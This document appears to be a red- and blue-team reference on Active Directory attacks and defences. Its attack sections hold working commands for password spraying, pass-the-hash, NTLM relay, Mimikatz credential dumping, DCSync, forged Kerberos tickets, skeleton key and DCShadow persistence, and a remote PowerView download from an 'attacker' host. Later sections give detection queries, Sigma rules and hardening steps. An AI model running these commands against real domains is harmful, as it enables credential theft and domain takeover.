# Active Directory — Attacks & Defense Deep Dive

> **Scope:** Active Directory attack techniques, post-exploitation paths, Kerberos abuse, privilege escalation, and corresponding defensive controls and detection logic. Structured for both red and blue team reference.

---

## Table of Contents

1. [AD Architecture Overview](#ad-architecture-overview)
2. [Enumeration & Reconnaissance](#enumeration--reconnaissance)
3. [Credential Attacks](#credential-attacks)
4. [Kerberos Attacks](#kerberos-attacks)
5. [Privilege Escalation Paths](#privilege-escalation-paths)
6. [Lateral Movement](#lateral-movement)
7. [Domain Persistence](#domain-persistence)
8. [Detection & Hunting](#detection--hunting)
9. [Defensive Hardening](#defensive-hardening)
10. [AD Security Assessment Checklist](#ad-security-assessment-checklist)

---

## AD Architecture Overview

```
Forest
└── Domain: corp.local
    ├── Domain Controllers
    │   ├── PDC Emulator (FSMO)
    │   └── Additional DCs
    ├── Organizational Units (OUs)
    │   ├── Workstations
    │   ├── Servers
    │   └── Users
    ├── Group Policy Objects (GPOs)
    ├── Sites & Subnets
    └── Trusts
        ├── Child domains
        └── External/forest trusts
```

### Key AD Components

| Component | Role |
|---|---|
| Domain Controller | Authenticates users, stores directory, replicates AD |
| SYSVOL | Shared folder on DCs storing GPOs, logon scripts |
| NTDS.dit | AD database — contains all hashes and objects |
| Global Catalog | Cross-domain search index |
| FSMO Roles | 5 single-master operations roles (PDC Emulator, RID Master, etc.) |
| Kerberos KDC | Issues TGTs (krbtgt) and service tickets |
| LDAP | Directory access protocol — used for all AD queries |
| DNS | AD-integrated DNS is critical for domain function |

### Trust Types

| Trust | Direction | Notes |
|---|---|---|
| Parent-Child | Bidirectional, transitive | Automatic within forest |
| Forest | Configurable | Between separate forests |
| External | Non-transitive | Legacy, specific domain-to-domain |
| Shortcut | Manual | Optimize auth paths |

---

## Enumeration & Reconnaissance

### PowerView

```powershell
# Import PowerView
Import-Module .\PowerView.ps1
# or IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Domain information
Get-Domain
Get-DomainController
Get-DomainTrust
Get-ForestTrust

# User enumeration
Get-DomainUser
Get-DomainUser -Properties name,memberof,description,lastlogon,pwdlastset
Get-DomainUser -Identity jsmith
Get-DomainUser -AdminCount 1   # Find admin accounts

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins"

# Computer enumeration
Get-DomainComputer -Properties name,operatingsystem,lastlogon
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainController -Domain corp.local

# Find where users are logged in
Get-NetLoggedon -ComputerName DC01
Get-NetSession -ComputerName DC01
Find-DomainUserLocation -UserName "DA_User"   # Find where DA is logged in

# ACL/permission enumeration
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}

# Find misconfigured ACLs (path to DA via ACL abuse)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM"}

# GPO enumeration
Get-DomainGPO
Get-DomainGPOUserLocalGroupMapping   # GPOs granting local admin

# Share enumeration
Find-DomainShare
Find-InterestingDomainShareFile -Include *.txt,*.ps1,*.xml,*.config
```

### BloodHound

BloodHound maps attack paths through AD by analyzing ACLs, group memberships, and session data.

```bash
# Collect data with SharpHound
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
.\SharpHound.exe -c DCOnly    # DC-only, less noise
.\SharpHound.exe -c All --stealth  # Slower but quieter

# Run BloodHound
neo4j console &
bloodhound &
# Upload zip file via GUI

# Useful Cypher queries
# Find shortest path to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# Find all DA sessions on non-DC hosts
MATCH (u:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
      (c:Computer)-[:HasSession]->(u)
WHERE NOT c.name ENDS WITH ".DC.CORP.LOCAL"
RETURN u.name, c.name

# Find Kerberoastable accounts with DA path
MATCH (u:User {hasspn:true}) WHERE u.admincount = true RETURN u.name

# Find computers where DA is admin
MATCH (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name
```

### LDAP Enumeration

```bash
# ldapsearch (Linux)
ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" \
  -D "corp\user" -w "Password1" "(objectClass=user)" cn sAMAccountName

# Enumerate users without authentication (null bind — often disabled)
ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" "(objectClass=user)"

# Find accounts with password not required
ldapsearch -H ldap://DC01 -x -b "DC=corp,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" cn

# Find accounts that don't require Kerberos pre-auth (AS-REP roastable)
ldapsearch -H ldap://DC01 -x -b "DC=corp,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" cn
```

---

## Credential Attacks

### Password Spraying

```powershell
# Spray single password against all users (avoid lockout!)
# ALWAYS check lockout policy first
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
# LockoutBadCount = threshold; ObservationWindow = reset period

# DomainPasswordSpray
Invoke-DomainPasswordSpray -Password 'Summer2024!' -Force

# Spray with custom user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Summer2024!'

# Wait between attempts to avoid lockout
# Rule: one attempt per user per (ObservationWindow - 5 minutes)
```

### Pass-the-Hash (PtH)

```bash
# Authenticate using NTLM hash instead of plaintext password
# Requires: NTLM hash of target account

# Impacket psexec
python3 psexec.py corp/Administrator@TARGET -hashes :NTLM_HASH

# Impacket smbexec (noisier, writes service)
python3 smbexec.py corp/Administrator@TARGET -hashes :NTLM_HASH

# Impacket wmiexec (no service install)
python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH

# CrackMapExec (enumerate / spray hashes)
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --sam   # Dump SAM
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH -x "whoami"
```

### Pass-the-Ticket (PtT)

```powershell
# Import a Kerberos ticket into current session
# Requires: .kirbi or .ccache file

# Mimikatz
kerberos::ptt ticket.kirbi
kerberos::list

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe klist
```

### NTLM Relay

```bash
# Capture and relay NTLM authentication to another service
# Requires: NTLM auth not required to be signed on target

# Setup responder to capture hashes
sudo responder -I eth0 -wdF

# Relay with ntlmrelayx (simultaneously)
# Disable SMB/HTTP in Responder.conf first
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (create new user, add to DA group)
python3 ntlmrelayx.py -tf dc01.corp.local -smb2support --delegate-access --escalate-user COMPUTER$

# With --no-http-server and --no-smb-server if needed
```

### Credential Dumping

```powershell
# Mimikatz — dump credentials from LSASS
privilege::debug
sekurlsa::logonpasswords           # Cleartext + hashes from LSASS
sekurlsa::wdigest                  # WDigest (cleartext if enabled)
sekurlsa::kerberos                 # Kerberos tickets
lsadump::sam                       # SAM database (local accounts)
lsadump::lsa /patch                # LSA secrets
lsadump::dcsync /domain:corp.local /user:krbtgt  # DCSync

# CrackMapExec credential dumping
crackmapexec smb TARGET -u Admin -p Pass --ntds     # Dump NTDS.dit via VSS
crackmapexec smb TARGET -u Admin -p Pass --lsa      # Dump LSA secrets

# Secretsdump (Impacket) — remote NTDS dump
python3 secretsdump.py corp/Administrator@DC01 -hashes :HASH
python3 secretsdump.py corp/Administrator@DC01 -outputfile hashes.txt
```

---

## Kerberos Attacks

### Kerberoasting

Request TGS tickets for service accounts (SPNs) — tickets are encrypted with the service account's NTLM hash and can be cracked offline.

```powershell
# Find Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request tickets and output for cracking
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Targeted Kerberoast (specific account)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

# Impacket GetUserSPNs
python3 GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip DC01 -request
python3 GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip DC01 -request -outputfile hashes.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
```

### AS-REP Roasting

Accounts with pre-authentication disabled will return an AS-REP encrypted with their NTLM hash — no credentials required to request.

```powershell
# Find AS-REP roastable accounts
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Roast without credentials
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Impacket (can run from Linux without credentials)
python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
python3 GetNPUsers.py corp.local/ -dc-ip DC01 -no-pass -usersfile users.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

### Golden Ticket

Forge TGTs using the krbtgt hash — valid for any user in the domain, bypasses all password changes.

```powershell
# Requirements: krbtgt NTLM hash, domain SID

# Get domain SID
Get-DomainSID  # or whoami /user

# Mimikatz golden ticket
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:FakeAdmin /id:500

# Rubeus
.\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:FakeAdmin /ptt

# Notes:
# - Survives password reset of any account EXCEPT krbtgt
# - Valid for 10 years by default
# - Detected by: 4769 events with ticket options 0x40810000 + non-DC source
```

### Silver Ticket

Forge TGS tickets for a specific service using the service account hash.

```powershell
# Requirements: service account NTLM hash, domain SID, target SPN

# Mimikatz silver ticket (CIFS service)
kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.local /service:cifs /rc4:SVC_HASH /user:Administrator

# Silver vs Golden:
# Silver: single service, needs service account hash, less DC contact = stealthier
# Golden: all services, needs krbtgt hash, more powerful
```

### Diamond Ticket

Modify a legitimate TGT rather than forge from scratch — harder to detect than golden ticket.

```powershell
# Rubeus diamond ticket
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256_KEY /createnetonly:C:\Windows\System32\cmd.exe
```

### Constrained Delegation Abuse

```powershell
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U2Self + S4U2Proxy to impersonate any user to the target service
.\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:"cifs/server01.corp.local" /ptt

# Unconstrained delegation — any service can be impersonated
# Find unconstrained delegation hosts
Get-DomainComputer -Unconstrained | Select-Object dnshostname
# Printer bug / SpoolSample to coerce DC auth to unconstrained delegation host
```

---

## Privilege Escalation Paths

### ACL Abuse

```powershell
# GenericAll on user → reset password / add to group
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force)
Add-DomainGroupMember -Identity "Domain Admins" -Members target_user

# WriteDACL on object → grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# ForceChangePassword right → reset password without knowing current
$cred = New-Object System.Management.Automation.PSCredential("corp\attacker", (ConvertTo-SecureString "Attacker1!" -AsPlainText -Force))
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force) -Credential $cred

# WriteOwner → take ownership, then WriteDACL
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attacker
```

### GPO Abuse

```powershell
# Find GPOs you can modify
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and 
                $_.SecurityIdentifier -match "S-1-5-21-..."}

# Use SharpGPOAbuse to add local admin or scheduled task via GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents "net user hacker P@ss /add && net localgroup administrators hacker /add" --GPOName "Default Domain Policy"
```

### DCSync

Replicate the AD database as if you were a Domain Controller — dumps all hashes.

```powershell
# Requirements: Replicating Directory Changes + Replicating Directory Changes All permissions
# Default holders: Domain Admins, Enterprise Admins, SYSTEM

# Mimikatz DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv

# Impacket (remote)
python3 secretsdump.py 'corp.local/DA_User:Password1@DC01.corp.local'
```

---

## Lateral Movement

### WMI Execution

```bash
# Remote process execution via WMI
python3 wmiexec.py corp/Administrator:Password@TARGET
python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb TARGET -u Admin -p Pass -x "whoami"
crackmapexec winrm TARGET -u Admin -p Pass -x "whoami"
```

### PsExec / Service-Based

```bash
# Impacket psexec (uploads binary, creates service)
python3 psexec.py corp/Admin:Pass@TARGET

# smbexec (no binary upload — uses cmd.exe via service)
python3 smbexec.py corp/Admin:Pass@TARGET
```

### DCOM Lateral Movement

```powershell
# Use DCOM objects for lateral execution (stealthier than psexec)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\Temp\payload.exe", $null, $null, "7")

# Via ShellWindows DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "TARGET"))
$com.Windows() | ForEach-Object { $_.Document.Application.ShellExecute("payload.exe") }
```

### Overpass-the-Hash

Convert NTLM hash to Kerberos TGT for authentication:

```powershell
# Mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:powershell.exe

# Rubeus (more stealthy — doesn't spawn process with stolen token)
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
```

---

## Domain Persistence

### Golden Ticket Persistence

```powershell
# After obtaining krbtgt hash, forge tickets indefinitely
# Mitigate: reset krbtgt password TWICE (tickets have 10hr max lifetime, 7 day renewal)
# Detection: Windows Event ID 4769, anomalous PAC fields
```

### AdminSDHolder Abuse

```powershell
# AdminSDHolder ACL propagates to all protected groups every 60 minutes
# Add yourself to AdminSDHolder ACL = persistent admin rights

Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
    -PrincipalIdentity attacker `
    -Rights All
```

### DSRM Abuse

```powershell
# Directory Services Restore Mode password — local admin on DC even after domain compromise
# Enable DSRM logon via network (disabled by default)
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Change DSRM password
ntdsutil "set dsrm password" "reset password on server null" "P@ssword1" q q
```

### Skeleton Key

```powershell
# Inject master password into LSASS on DC — all accounts accept both real and skeleton key
# Mimikatz (runs in memory, lost on reboot)
misc::skeleton

# After injection, any account can authenticate with password "mimikatz"
net use \\DC01\C$ /user:domain\Administrator mimikatz
```

### DCShadow

```powershell
# Register a rogue DC in AD, push arbitrary changes
# Requires DA privileges initially

# Terminal 1: Register as fake DC
mimikatz # lsadump::dcshadow /object:CN=attacker,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:512

# Terminal 2: Push changes
mimikatz # lsadump::dcshadow /push
```

---

## Detection & Hunting

### Critical Windows Event IDs

| Event ID | Description | Attack Relevance |
|---|---|---|
| 4624 | Successful logon | Lateral movement, PtH (LogonType 3) |
| 4625 | Failed logon | Password spray, brute force |
| 4648 | Explicit credential logon | RunAs, PtH, lateral movement |
| 4662 | Object access (LDAP) | DCSync (GUID monitoring) |
| 4663 | Object access | File/directory access |
| 4672 | Special privilege logon | Admin rights granted |
| 4688 | Process creation | Execution tracking |
| 4720 | User account created | Persistence |
| 4728/4732/4756 | Member added to group | Privilege escalation |
| 4769 | TGS requested | Kerberoasting (RC4 cipher alert) |
| 4771 | Pre-auth failure | AS-REP roasting, spray |
| 4776 | NTLM credential validation | PtH detection |
| 5145 | Network share access | SMB enumeration, lateral movement |
| 7045 | Service installed | PsExec, lateral movement |
| 8004 | Kerberos AS-REQ | Unusual AS-REQ patterns |

### Kerberoasting Detection

```powershell
# Alert on TGS requests for service tickets encrypted with RC4 (type 23)
# Modern environments should use AES encryption — RC4 requests = Kerberoasting

# KQL (Sentinel / Defender)
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"   // RC4
| where ServiceName !endswith "$"         // Not computer accounts
| where ServiceName !in ("krbtgt", "kadmin")
| summarize count() by AccountName, ServiceName, IpAddress
| where count_ > 5
```

### DCSync Detection

```powershell
# DCSync uses DRSUAPI replication rights — generates Event 4662
# Alert on: 4662 events where AccessMask = 0x100 AND Properties contain replication GUIDs

# GUID for "Replicating Directory Changes": {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
# GUID for "Replicating Directory Changes All": {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}

Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662]]" |
  Where-Object {
    $_.Properties[8].Value -match "1131f6aa|1131f6ab" -and
    $_.Properties[3].Value -notmatch "Domain Controller"
  }
```

### Lateral Movement Detection

```powershell
# Detect PsExec / service-based lateral movement
# Event 7045 (service installed) + 4624 (logon type 3) from same source

# Alert: Workstation to workstation SMB (not workstation to server)
# Most environments: workstations should not connect to each other via SMB

# WMI lateral movement
Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" |
  Where-Object {$_.Id -eq 5857 -or $_.Id -eq 5861}
```

### BloodHound Detection (SharpHound)

```powershell
# SharpHound generates large volumes of LDAP queries
# Event ID 1644 (LDAP query stats) on DC

# Detect by volume: hundreds of LDAP queries in short period from single source
# Detect by pattern: sequential enumeration of all users, computers, groups
```

### Sigma Rules

```yaml
title: Kerberoasting via RC4 Encryption
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter:
        ServiceName|endswith: '$'
    condition: selection and not filter
level: high
tags:
    - attack.credential_access
    - attack.t1558.003

---

title: DCSync via Replication
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
            - '1131f6ab-9c07-11d1-f79f-00c04fc2dcd2'
    filter:
        SubjectUserName|endswith: '$'   # Filter out legitimate DC replication
    condition: selection and not filter
level: critical

---

title: AdminSDHolder Modification
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        ObjectDN|contains: 'CN=AdminSDHolder'
    condition: selection
level: critical
```

---

## Defensive Hardening

### Privileged Access Model

```
Tier 0: Domain Controllers, AD infrastructure, PKI
    → Only Tier 0 admins can log in
    → No internet access, locked down workstations

Tier 1: Servers, applications
    → Only Tier 1 admins (separate accounts from Tier 0)
    → No access to Tier 0 systems

Tier 2: Workstations, end-user devices
    → Helpdesk admins (separate accounts again)
    → No access to Tier 0 or Tier 1

Goal: Credential theft at one tier cannot be used at a higher tier
```

### Credential Hygiene

```powershell
# Disable WDigest (prevents cleartext passwords in LSASS)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" -Value 0

# Enable Protected Users group for privileged accounts
# Protected Users: no NTLM, no DES/RC4, 4hr TGT lifetime, no delegation
Add-ADGroupMember -Identity "Protected Users" -Members "DA_User1","DA_User2"

# Enable Credential Guard (Virtualization-Based Security)
# Prevents LSASS credential extraction

# Disable LLMNR (eliminates Responder attack surface)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -Value 0

# Disable NetBIOS over TCP/IP
# Via DHCP scope option 001 or NIC properties
```

### Kerberos Hardening

```powershell
# Enforce AES encryption — eliminate RC4 (removes Kerberoasting effectiveness)
# Set msDS-SupportedEncryptionTypes = 24 (AES128 + AES256) on service accounts

# Rotate krbtgt password regularly
# Use ADKerberosDelegation module or Microsoft's New-KrbtgtKeys.ps1
# Rotate twice (once to invalidate old tickets, once more 10 hours later)

# AS-REP roasting prevention — require pre-auth for all accounts
# Audit accounts with DONT_REQ_PREAUTH flag:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Fix:
Set-ADAccountControl -Identity account -DoesNotRequirePreAuth $false
```

### ACL Hardening

```powershell
# Audit delegated permissions — find non-admin objects with replication rights
Get-ADObject -Filter * -Properties ntSecurityDescriptor | 
  Where-Object {$_.ntSecurityDescriptor.Access | 
    Where-Object {$_.ObjectType -match "1131f6aa|1131f6ab" -and 
                  $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"}}

# Remove dangerous permissions from default objects
# AdminSDHolder — audit who has write access
# Domain object root — audit for WriteDACL, GenericAll

# Enable AD Recycle Bin
Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target 'corp.local'
```

### LAPS (Local Administrator Password Solution)

```powershell
# LAPS randomizes and manages local Administrator passwords
# Prevents lateral movement via shared local admin creds

# Install LAPS
msiexec /q /i LAPS.x64.msi

# Set permissions
Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=local"

# Read LAPS password (requires permission)
Get-AdmPwdPassword -ComputerName WORKSTATION01
```

### Monitoring & Alerting Priorities

| Priority | Control | Attack Prevented |
|---|---|---|
| Critical | Monitor Event 4662 (DCSync GUIDs) | DCSync |
| Critical | Tier 0 logon outside DCs | Golden ticket use |
| Critical | AdminSDHolder modifications | Persistent DA path |
| High | Event 4769 RC4 TGS requests | Kerberoasting |
| High | Event 4624 Type 3 from workstation→workstation | Lateral movement |
| High | SMB signing enforcement | NTLM relay |
| High | New DA/EA/Schema Admin group members | Privilege escalation |
| Medium | LDAP query volume anomalies | BloodHound collection |
| Medium | New SPNs on user accounts | Targeted Kerberoasting |

---

## AD Security Assessment Checklist

```
Domain Configuration
☐ Default Domain Policy password settings (length, complexity, lockout)
☐ Accounts with password never expires
☐ Accounts with password not required
☐ Stale/inactive accounts (90+ days since last logon)
☐ AS-REP roastable accounts (no pre-auth required)
☐ Kerberoastable accounts (service accounts with weak passwords)
☐ krbtgt password age (should be rotated periodically)

Privilege Review
☐ Members of Domain Admins, Enterprise Admins, Schema Admins
☐ Members of Backup Operators, Account Operators, Print Operators
☐ Accounts in Protected Users group (should include all DA+)
☐ Service accounts with unnecessary admin rights
☐ Local admin sprawl (who has local admin on what)

Delegation
☐ Unconstrained delegation hosts (except DCs)
☐ Constrained delegation configurations
☐ Resource-Based Constrained Delegation (RBCD) misconfigurations

ACL/Permissions
☐ Non-admin write access to DA/EA groups
☐ Non-admin write access to GPOs
☐ Non-admin DCSync rights on domain object
☐ AdminSDHolder ACL review
☐ Computer object write permissions (RBCD abuse path)

Infrastructure
☐ LAPS deployed on all workstations and servers
☐ SMB signing enforced (prevents NTLM relay)
☐ LDAP signing and channel binding
☐ WDigest disabled
☐ Credential Guard enabled
☐ Tiered admin model implemented
☐ AD audit policy (4662, 4769, 4624, etc.) enabled and forwarded to SIEM
```

---

## References

- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerView / PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Impacket](https://github.com/fortra/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [MITRE ATT&CK: Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [SpecterOps BloodHound Blog](https://posts.specterops.io/)
- [Harmj0y AD Security Blog](https://blog.harmj0y.net/)
- [Microsoft AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
- [Pingcastle AD Health Check](https://www.pingcastle.com/)
- [Purple Knight](https://www.purple-knight.com/) — Free AD assessment tool
